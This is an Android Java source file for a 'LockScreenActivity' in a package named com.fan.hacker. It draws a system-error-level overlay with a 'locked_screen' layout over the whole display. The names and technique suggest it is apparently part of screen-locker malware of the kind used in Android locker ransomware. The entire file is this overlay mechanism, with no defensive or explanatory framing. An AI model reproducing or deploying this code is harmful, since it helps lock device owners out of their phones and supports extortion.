package com.fan.hacker;

import android.app.Activity;
import android.graphics.PixelFormat;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.RelativeLayout;

public class LockScreenActivity extends Activity {
	public static WindowManager winManager;
	public static RelativeLayout wrapperView;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		//KeyguardManager keyguardManager=(KeyguardManager )getSystemService(Context.KEYGUARD_SERVICE);
		WindowManager.LayoutParams localLayoutParams = new WindowManager.LayoutParams( WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE|
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL|
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT);
        this.winManager = ((WindowManager)getApplicationContext().getSystemService(WINDOW_SERVICE));
        this.wrapperView = new RelativeLayout(getBaseContext());
        getWindow().setAttributes(localLayoutParams);
        View.inflate(this,com.fan.hackerpro.R.layout.locked_screen, this.wrapperView);
        this.winManager.addView(this.wrapperView, localLayoutParams);	

	}
}
